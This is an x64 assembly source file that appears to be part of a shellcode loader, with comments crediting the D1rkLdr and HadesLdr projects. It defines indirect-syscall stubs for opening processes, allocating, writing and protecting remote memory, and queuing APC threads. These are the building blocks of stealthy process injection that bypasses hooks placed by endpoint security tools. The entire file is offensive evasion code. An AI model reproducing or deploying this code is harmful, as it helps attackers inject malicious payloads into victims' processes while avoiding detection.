; Thanks to:
; https://github.com/TheD1rkMtr/D1rkLdr/blob/main/D1rkLdr/D1rk%20Loader/syscalls.asm
; and https://github.com/CognisysGroup/HadesLdr/blob/main/IDSyscall/IDSyscall/syscallStuff.asm

.data
	SSN WORD 000h
	syscallAddr QWORD 0h

.code

	GetSyscall proc
					mov SSN, cx
					ret
	GetSyscall endp

	GetSyscallAddr proc
			mov syscallAddr, rcx
			ret
	GetSyscallAddr endp

	sysNtOpenProcessToken proc
					mov r10, rcx
					mov ax, SSN
					jmp	qword ptr syscallAddr
					ret
	sysNtOpenProcessToken endp


	sysNtOpenProcess proc
					mov r10, rcx
					mov ax, SSN
					jmp	qword ptr syscallAddr
					ret
	sysNtOpenProcess endp

	sysNtAllocateVirtualMemory proc
					mov r10, rcx
					mov ax, SSN
					jmp	qword ptr syscallAddr
					ret
	sysNtAllocateVirtualMemory endp

	sysNtWriteVirtualMemory proc
					mov r10, rcx
					mov ax, SSN
					jmp	qword ptr syscallAddr
					ret
	sysNtWriteVirtualMemory endp

	sysmemcpy proc
			mov r10, rcx
			mov ax, SSN
			jmp	qword ptr syscallAddr
			ret
	sysmemcpy endp

	sysNtProtectVirtualMemory proc
					mov r10, rcx
					mov ax, SSN
					jmp	qword ptr syscallAddr
					ret
	sysNtProtectVirtualMemory endp
	
	sysNtDelayExecution proc
					mov r10, rcx
					mov ax, SSN
					jmp	qword ptr syscallAddr
					ret
	sysNtDelayExecution endp

	sysNtWaitForSingleObject proc
					mov r10, rcx
					mov ax, SSN
					jmp	qword ptr syscallAddr
					ret
	sysNtWaitForSingleObject endp

	sysNtQueueApcThread proc
				mov r10, rcx
				mov ax, SSN
				jmp	qword ptr syscallAddr
				ret
	sysNtQueueApcThread endp

end
